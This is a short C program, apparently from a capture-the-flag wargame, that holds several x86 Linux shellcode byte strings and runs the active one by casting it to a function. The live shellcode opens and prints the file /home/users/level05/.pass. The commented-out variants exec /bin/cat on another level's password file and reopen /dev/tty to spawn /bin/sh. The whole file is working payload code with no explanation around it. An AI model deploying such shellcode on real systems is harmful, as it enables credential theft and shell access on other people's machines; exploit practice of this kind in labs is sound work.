#include<stdio.h>
#include<string.h>

// char code[] = "\x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x73\x00\x00\x00\x68\x2e\x70\x61\x73\x68\x6c\x30\x34\x2f\x68\x6c\x65\x76\x65\x68\x65\x72\x73\x2f\x68\x65\x2f\x75\x73\x68\x2f\x68\x6f\x6d\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80";
// char code[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
// char code[] = "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";

char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff/home/users/level05/.pass";


int main()
{

  printf("Shellcode Length:  %lu\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}